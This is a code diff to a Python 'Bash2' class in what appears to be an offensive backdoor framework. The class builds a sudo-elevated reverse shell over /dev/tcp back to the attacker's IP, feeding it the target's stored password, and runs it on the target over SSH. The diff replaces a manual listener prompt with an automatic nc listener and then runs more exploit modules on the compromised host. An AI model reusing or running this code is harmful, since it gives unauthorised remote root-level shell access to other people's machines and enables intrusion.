@@ -14,24 +14,17 @@ class Bash2(Backdoor):
         self.allow_modules = True
         self.modules = {} 
         self.help_text = ""
+    
     def get_command(self):
         return "echo " + self.core.curtarget.pword + " | sudo -S nohup 0<&196;exec 196<>/dev/tcp/" + self.core.localIP + "/%s; sh <&196 >&196 2>&196" % self.get_value("port")
     
     def do_exploit(self, args):
-
-	port = self.get_value("port")
-	ssh = subprocess.Popen(["./ssh.sh"], stdout=subprocess.PIPE,shell=True)
-	(out, err) = ssh.communicate()
-	if str(out) == 'n':
-	    print "lol"
-	    os.system("gnome-terminal -e 'nc -v -n -l -p " + str(port) + "'")
-	else:
-	    print out
-
+        port = self.get_value("port")
         target = self.core.curtarget
-        raw_input("Please enter the following command: nc -v -n -l -p %s in another shell to connect." % port)
         print(GOOD + "Initializing backdoor...")
         target.ssh.exec_command(self.get_command())
+        os.system("nc -v -n -l -p " + str(port))
+
         for mod in self.modules.keys():
             print(INFO + "Attempting to execute " + mod.name + " module...")
             mod.exploit()
